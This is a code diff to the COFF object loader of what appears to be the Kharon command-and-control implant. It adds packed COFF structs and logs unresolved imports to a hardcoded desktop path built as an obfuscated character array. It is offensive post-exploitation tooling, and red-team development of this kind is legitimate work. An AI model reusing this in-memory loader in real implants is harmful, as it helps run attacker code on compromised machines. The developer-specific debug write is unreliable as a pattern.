@@ -1,5 +1,48 @@
 #include <Kharon.h>
 
+// COFF structures must be packed to match the on-disk format exactly.
+// The -fpack-struct=8 compiler flag may pad system definitions differently.
+#pragma pack(push, 1)
+typedef struct _COFF_FILE_HEADER {
+    USHORT Machine;
+    USHORT NumberOfSections;
+    ULONG  TimeDateStamp;
+    ULONG  PointerToSymbolTable;
+    ULONG  NumberOfSymbols;
+    USHORT SizeOfOptionalHeader;
+    USHORT Characteristics;
+} COFF_FILE_HEADER;
+
+typedef struct _COFF_SYMBOL {
+    union {
+        CHAR ShortName[8];
+        struct { ULONG Short; ULONG Long; } Name;
+    } N;
+    ULONG  Value;
+    SHORT  SectionNumber;
+    USHORT Type;
+    BYTE   StorageClass;
+    BYTE   NumberOfAuxSymbols;
+} COFF_SYMBOL;
+
+typedef struct _COFF_SECTION_HEADER {
+    CHAR   Name[8];
+    ULONG  VirtualSize;
+    ULONG  VirtualAddress;
+    ULONG  SizeOfRawData;
+    ULONG  PointerToRawData;
+    ULONG  PointerToRelocations;
+    ULONG  PointerToLinenumbers;
+    USHORT NumberOfRelocations;
+    USHORT NumberOfLinenumbers;
+    ULONG  Characteristics;
+} COFF_SECTION_HEADER;
+#pragma pack(pop)
+
+static_assert(sizeof(COFF_FILE_HEADER) == 20, "COFF_FILE_HEADER must be 20 bytes");
+static_assert(sizeof(COFF_SYMBOL) == 18, "COFF_SYMBOL must be 18 bytes");
+static_assert(sizeof(COFF_SECTION_HEADER) == 40, "COFF_SECTION_HEADER must be 40 bytes");
+
 auto Coff::GetCmdID(
     PVOID Address
 ) -> ULONG {
@@ -226,9 +269,9 @@ auto Coff::Map(
 
     UINT8 Iterator = 0;
 
-    PIMAGE_FILE_HEADER    Header  = { 0 };
-    IMAGE_SECTION_HEADER* SecHdr  = { 0 };
-    PIMAGE_SYMBOL         Symbols = { 0 };
+    COFF_FILE_HEADER*    Header  = { 0 };
+    COFF_SECTION_HEADER* SecHdr  = { 0 };
+    COFF_SYMBOL*         Symbols = { 0 };
     PIMAGE_RELOCATION     Relocs  = { 0 };
 
     KhDbg("starting COFF mapping process");
@@ -240,13 +283,13 @@ auto Coff::Map(
 
     Mem::Zero( (UPTR)Mapped, sizeof(COFF_MAPPED) );
 
-    if ( !Buffer || Size < sizeof(IMAGE_FILE_HEADER) ) {
+    if ( !Buffer || Size < sizeof(COFF_FILE_HEADER) ) {
         KhDbg("invalid COFF buffer or size");
         return FALSE;
     }
 
-    Header  = (PIMAGE_FILE_HEADER)Buffer;
-    SecHdr  = (IMAGE_SECTION_HEADER*)(Buffer + sizeof(IMAGE_FILE_HEADER));
+    Header  = (COFF_FILE_HEADER*)Buffer;
+    SecHdr  = (COFF_SECTION_HEADER*)(Buffer + sizeof(COFF_FILE_HEADER));
     SecNbrs = Header->NumberOfSections;
     SymNbrs = Header->NumberOfSymbols;
 
@@ -257,13 +300,13 @@ auto Coff::Map(
 
     if ( 
         Header->PointerToSymbolTable >= Size || 
-        Header->PointerToSymbolTable + ( SymNbrs * sizeof(IMAGE_SYMBOL) ) > Size
+        Header->PointerToSymbolTable + ( SymNbrs * sizeof(COFF_SYMBOL) ) > Size
     ) {
         KhDbg("invalid symbol table offset");
         return FALSE;
     }
 
-    Symbols = (PIMAGE_SYMBOL)( Buffer + Header->PointerToSymbolTable );
+    Symbols = (COFF_SYMBOL*)( Buffer + Header->PointerToSymbolTable );
     KhDbg("found %d sections and %d symbols", SecNbrs, SymNbrs);
 
     COFF_DATA CoffData = { 0 };
@@ -286,13 +329,12 @@ auto Coff::Map(
             SymName = (PCHAR)&Symbols[i].N.ShortName;
         } else {
             ULONG NameOffset = Symbols[i].N.Name.Long;
-            
-            if ( Header->PointerToSymbolTable + (SymNbrs * sizeof(IMAGE_SYMBOL)) + NameOffset >= Size ) {
+            if ( Header->PointerToSymbolTable + (SymNbrs * sizeof(COFF_SYMBOL)) + NameOffset >= Size ) {
                 KhDbg("symbol name out of bounds (index %d)", i);
-                continue;  
+                continue;
             }
 
-            SymName = (PCHAR)(Buffer + Header->PointerToSymbolTable + (SymNbrs * sizeof(IMAGE_SYMBOL)) + NameOffset);
+            SymName = (PCHAR)(Buffer + Header->PointerToSymbolTable + (SymNbrs * sizeof(COFF_SYMBOL)) + NameOffset);
         }
 
         if ( !SymName ) {
@@ -311,7 +353,22 @@ auto Coff::Map(
             CoffData.Sym[i].Type = COFF_IMP;
             CoffData.Sym[i].Ptr  = this->RslApi(SymName);
             if ( !CoffData.Sym[i].Ptr ) {
-                KhDbg("COFF: unresolved import %s - aborting load", SymName);
+                // Write failed import to file for debugging
+                CHAR dbgPath[] = {'C',':','\\','U','s','e','r','s','\\','Q','u','i','c','k',
+                    'e','m','u','\\','D','e','s','k','t','o','p','\\','c','o','f','f','_',
+                    'e','r','r','.','t','x','t',0};
+                HANDLE hFile = Self->Krnl32.CreateFileA(dbgPath, 0x40000000/*GENERIC_WRITE*/, 0, 0, 4/*OPEN_ALWAYS*/, 0x80, 0);
+                if (hFile && hFile != (HANDLE)-1) {
+                    Self->Krnl32.SetFilePointer(hFile, 0, 0, 2/*FILE_END*/);
+                    ULONG written = 0;
+                    // Write the unresolved symbol name
+                    ULONG snl = Str::LengthA(SymName);
+                    if (snl > 200) snl = 200;
+                    Self->Krnl32.WriteFile(hFile, (PVOID)SymName, snl, &written, 0);
+                    BYTE crlf[2] = {'\r','\n'};
+                    Self->Krnl32.WriteFile(hFile, (PVOID)crlf, 2, &written, 0);
+                    Self->Ntdll.NtClose(hFile);
+                }
                 if ( CoffData.Sec ) KhFree( CoffData.Sec );
                 if ( CoffData.Sym ) KhFree( CoffData.Sym );
                 return FALSE;
@@ -371,7 +428,7 @@ auto Coff::Map(
             Relocs = (PIMAGE_RELOCATION)( Buffer + SecHdr[i].PointerToRelocations );
 
             for ( INT x = 0; x < SecHdr[i].NumberOfRelocations; x++ ) {
-                PIMAGE_SYMBOL SymReloc = &Symbols[Relocs[x].SymbolTableIndex];
+                COFF_SYMBOL* SymReloc = &Symbols[Relocs[x].SymbolTableIndex];
                 PVOID RelocAddr = (PVOID)((ULONG_PTR)CoffData.Sec[i].Base + Relocs[x].VirtualAddress);
 
                 if ( Relocs[x].Type == IMAGE_REL_AMD64_REL32 && CoffData.Sym[Relocs[x].SymbolTableIndex].Type == COFF_IMP ) {
